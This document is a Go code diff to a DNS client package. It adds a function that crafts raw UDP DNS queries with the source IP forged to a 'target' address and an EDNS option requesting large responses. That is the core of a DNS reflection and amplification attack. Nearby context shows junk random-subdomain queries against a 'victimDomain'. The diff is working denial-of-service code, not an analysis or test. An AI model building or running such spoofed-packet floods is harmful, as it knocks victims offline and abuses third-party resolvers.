@@ -2,8 +2,13 @@ package internal
 
 import (
 	"fmt"
+	"log"
 	"math/rand"
+	"net"
 	"time"
+
+	"github.com/google/gopacket"
+	"github.com/google/gopacket/layers"
 
 	"github.com/miekg/dns"
 )
@@ -34,6 +39,59 @@ func (c DNSClient) SendJunkDomainsRequest(nQuestions int, victimDomain string) (
 	}
 	dnsError = dns.RcodeToString[r.Rcode]
 	return
+}
+
+func createPacket(targetIP net.IP, targetPort int, resolverIP net.IP) []byte {
+	buf := gopacket.NewSerializeBuffer()
+	opts := gopacket.SerializeOptions{
+		FixLengths:       true,
+		ComputeChecksums: true,
+	}
+
+	ipLayer := &layers.IPv4{
+		Version:  4,
+		TTL:      255,
+		SrcIP:    targetIP,
+		DstIP:    resolverIP,
+		Protocol: layers.IPProtocolUDP,
+	}
+	udpLayer := &layers.UDP{
+		SrcPort: layers.UDPPort(targetPort),
+		DstPort: layers.UDPPort(53),
+	}
+	dnsLayer := &layers.DNS{
+		// Header fields
+		ID:     42,
+		QR:     false, // QR=0 is query
+		OpCode: layers.DNSOpCodeQuery,
+		RD:     true,
+		// Entries
+		Questions: []layers.DNSQuestion{
+			{
+				Name:  []byte("cloudflare.com"),
+				Type:  layers.DNSTypeA,
+				Class: 1,
+			},
+		},
+		Additionals: []layers.DNSResourceRecord{
+			{
+				Type:  layers.DNSTypeOPT,
+				Class: 4096,
+			},
+		},
+	}
+	err := udpLayer.SetNetworkLayerForChecksum(ipLayer)
+	if err != nil {
+		log.Fatalf("Failed to set network layer for checksum: %v\n", err)
+	}
+
+	err = gopacket.SerializeLayers(buf, opts, ipLayer, udpLayer, dnsLayer)
+	if err != nil {
+		log.Fatalf("Failed to serialize packet: %v\n", err)
+	}
+	packetData := buf.Bytes()
+	// fmt.Println(hex.Dump(packetData))
+	return packetData
 }
 
 func (c *DNSClient) randomDomain(victimDomain string) string {
